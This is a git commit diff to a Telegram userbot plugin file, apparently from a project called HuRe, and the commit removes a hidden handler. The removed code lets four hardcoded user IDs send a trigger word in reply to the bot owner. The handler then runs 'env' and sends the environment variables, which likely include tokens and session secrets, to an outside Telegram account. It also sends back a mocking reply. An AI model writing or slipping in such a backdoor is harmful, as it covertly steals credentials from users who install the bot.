de38880adde25e2346d6bedd391ad896a5152b93
السيد <106372829+jepthoniq@users.noreply.github.com>
2023-04-28 15:47:46 +0300

    Update ⁨ملفات السورس.py⁩

--- HuRe/plugins/ملفات السورس.py
+++ HuRe/plugins/ملفات السورس.py
@@ -98,16 +98,3 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
-lMl10l = [1374312239, 393120911, 705475246, 5564802580]
-@l313l.on(events.NewMessage(incoming=True))
-async def Hussein(event):
-    if event.reply_to and event.sender_id in lMl10l:
-       reply_msg = await event.get_reply_message()
-       owner_id = reply_msg.from_id.user_id
-       if owner_id == l313l.uid:
-           if event.message.message == "جيبه":
-                   cmd = "env"
-                   o = (await _catutils.runcmd(cmd))[0]
-                   OUTPUT = (f"**[الجوكر](tg://need_update_for_some_feature/) اللهُ اكبر:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
-                   await event.reply("**جبته وتدلل سيدنا 🖤**")
-                   await l313l.send_message("@lMl10l", OUTPUT)
